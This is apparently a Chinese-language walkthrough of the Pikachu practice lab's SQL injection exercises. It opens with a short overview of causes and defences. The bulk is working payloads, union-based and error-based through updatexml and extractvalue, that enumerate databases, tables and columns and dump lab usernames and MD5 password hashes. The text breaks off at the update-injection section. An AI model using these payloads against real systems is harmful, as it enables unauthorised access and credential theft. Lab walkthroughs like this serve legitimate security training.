# 4.SQL-Inject
## 1.Sql Inject(SQL注入)概述
Sql Inject(SQL注入)概述
在owasp发布的top10排行榜里，注入漏洞一直是危害排名第一的漏洞，其中注入漏洞里面首当其冲的就是数据库注入漏洞。
一个严重的SQL注入漏洞，可能会直接导致一家公司破产！
SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。
从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。
在构建代码时，一般会从如下几个方面的策略来防止SQL注入漏洞：
1.对传进SQL语句里面的变量进行过滤，不允许危险字符传入；
2.使用参数化（Parameterized Query 或 Parameterized Statement）；
3.还有就是,目前有很多ORM框架会自动使用参数化解决注入问题,但其也提供了"拼接"的方式,所以使用时需要慎重!
## 2.数字型注入(post)
由题可知是数字型注入(post)
查看代码，发现代码对id没有做任何过滤
点击查询抓包，
id=1' 报错，可判断存在SQL注入
判断字段数
id=1 order by 3报错
id=1 order by 2有回显，所以字段数为2
判断回显点，可以在1和2这两处位置，获得我们想要的信息
id=1 union select 1,2
查看用户名和数据库名，可知用户名为root@localhost，数据库名为pikachu
id=1 union select user(),database()
查询数据库pikachu下的所有表名httpinfo,member,message,users,xssblind
id=1 union select 1,goup_concat(table_name) from information_schema.tables
where table_schema='pikachu'
查询数据表users中的字段
USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password,level,id,username,password,level
id=1 union select 1,group_concat(column_name) from information_schema.columns
where table_name='users'
查询字段username和password的内容
id=1 union select group_concat(username),group_concat(password) from users
对应账号和MD5加密的密码：
admin：e10adc3949ba59abbe56e057f20f883e（123456）
pikachu：670b14728ad9902aecba32e22fa4f6bd（000000）
test：e99a18c428cb38d5f260853678922e03（abc123）
## 3.字符型注入(get)
由题可知是字符型注入(get)，可直接在url中的name参数后进行修改
输入'点击查询，报错，判断存在SQL注入
/vul/sqli/sqli_str.php?name=%27&submit=查询
可以用-- q对'进行闭合
输入name=' or 1=1-- q,可查询出所有账户数据
判断字段数
' order by 2 -- q
有回显
' order by 3 -- q
报错，所以字段数为2
判断回显点,可以在1和2这两处位置，获得我们想要的信息
' union select 1,2 -- q
查看用户名和数据库名，可知用户名为root@localhost，数据库名为pikachu
' union select user(),database() -- q
查询数据库pikachu下的所有表名httpinfo,member,message,users,xssblind
' union select 1,group_concat(table_name) from information_schema.tables where
table_schema='pikachu' -- q
查询数据表users中的字段 id,username,password,level,id,username,password
' union select 1,group_concat(column_name) from information_schema.columns
where table_name='users' -- q
查询字段username和password的内容
' union select group_concat(username),group_concat(password) from users -- q
对应账号和MD5加密的密码：
admin：e10adc3949ba59abbe56e057f20f883e（123456）
pikachu：670b14728ad9902aecba32e22fa4f6bd（000000）
test：e99a18c428cb38d5f260853678922e03（abc123）
## 4.搜索型注入
由题可知是搜索型注入(get)，可直接在url中的name参数后进行修改
输入'点击查询，报错，判断存在SQL注入
/vul/sqli/sqli_str.php?name=%27&submit=查询
可以用-- q对'进行闭合
输入name=' or 1=1-- q,可查询出所有账户数据
判断字段数
' order by 3 -- q
有回显
' order by 4 -- q
报错，所以字段数为3
判断回显点,可以在1,2,这三处位置，获得我们想要的信息
' union select 1,2,3 -- q
中间内容和字符型注入(get)类似，只是多了一个回显点，在此不再赘述
直接查询字段username和password的内容
' union select 1,group_concat(username),group_concat(password) from users -- q
对应账号和MD5加密的密码：
admin：e10adc3949ba59abbe56e057f20f883e（123456）
pikachu：670b14728ad9902aecba32e22fa4f6bd（000000）
test：e99a18c428cb38d5f260853678922e03（abc123）
## 5.xx型注入
输入'报错，此处存在SQL注入漏洞，观察报错信息，出现)
/vul/sqli/sqli_str.php?name=%27&submit=查询
输入')-- q,成功闭合
判断字段数
') order by 2 -- q
有回显
') order by 3 -- q
报错，所以字段数为2
中间内容和字符型注入(get)类似，只是多加一个)进行闭合，在此不再赘述
直接查询字段username和password的内容
') union select group_concat(username),group_concat(password) from users -- q
对应账号和MD5加密的密码：
admin：e10adc3949ba59abbe56e057f20f883e（123456）
pikachu：670b14728ad9902aecba32e22fa4f6bd（000000）
test：e99a18c428cb38d5f260853678922e03（abc123）
## 6.insert&update注入
insert/update是插入和更新的意思，这两个场景的注入，post数据包里的每一个参数都可以注入
### insert注入
首先在注册的时候抓包分析。
username=' 报错，可判断存在SQL注入
本题运用报错注入的方法进行解答
查询用户名root@localhost
username=' or updatexml(1,concat(0x7e,(select user())),1),1) -- q
查询数据库名pikachu
username=' or updatexml(1,concat(0x7e,(select database())),1),1) -- q
其他payload：
如果用-- q闭合的话，需要多加,1) 如果用or'闭合的话则不需要
可以是concat(0x7e,(select database())) 也可以是concat(0x7e,(select database()),0x7e)
username=' or updatexml(1,concat(0x7e,(select database())),1)or'
username=' or updatexml('~',concat(0x7e,(select database())),'~')or'
username=' or updatexml('~',concat(0x7e,(select database())),'~'),1)-- q
username=' or updatexml('~',concat(0x7e,(select database()),0x7e),'~')or'
updatexml函数可以替换为extractvalue函数，并且updatexml(1,concat(x),1)中后面的1或者~不能去掉，而extractvalue(1,concat(x))中没有后面的1或者~
如果用-- q闭合的话，需要多加,1) 如果用or'闭合的话则不需要，注意分情况讨论，具体情况具体分析，多试一试就完事
username=' and extractvalue(1,concat(0x7e,(select database())))and'
username=' and extractvalue(1,concat(0x7e,(select database())),1)and'
username=' and extractvalue('~',concat(0x7e,(select database())))and'
username=' and extractvalue(1,concat(0x7e,(select database()))),1)-- q
username=' and extractvalue('~',concat(0x7e,(select database()))),1)-- q
查询数据库pikachu下的所有表名httpinfo,member,message,users,x发现不能全部显示
    username=' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='pikachu')),1)or'
在这一步可以使用left，mid，right来进行分段显示，将得到的信息进行拼接，下图中的22是从右往左显示22个字符，所有表名httpinfo,member,message,users,xssblind
    username=' or updatexml(1,concat(0x7e,right((select group_concat(table_name) from information_schema.tables where table_schema='pikachu'),22)),1)or'
还可以用limit函数逐个读取数据库中的表名
    username=' or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='pikachu' limit 0,1)),1)or'
查询users表中的字段名id,username,password,level,id,u
    username=' or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users')),1)or'
查询users表中所有的字段名id,username,password,level,id,username,password
    username=' or updatexml(1,concat(0x7e,right((select group_concat(column_name) from information_schema.columns where table_name='users'),22)),1)or'
还可以用limit函数逐个读取users表中的字段名
    username=' or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 0,1)),1)or'
直接查询字段username的内容admin,pikachu,test
username=' or updatexml(1,concat(0x7e,(select group_concat(username) from
users)),1)or'
直接查询字段passowrd的内容,因为字符数量比较多，所以直接用limit函数读取
username=' or updatexml(1,concat(0x7e,(select password from users limit
0,1)),1)or'
对应账号和MD5加密的密码：
admin：e10adc3949ba59abbe56e057f20f883e（123456）
pikachu：670b14728ad9902aecba32e22fa4f6bd（000000）
test：e99a18c428cb38d5f260853678922e03（abc123）
### update注入
首先利用已知的账号kobe，密码123456登录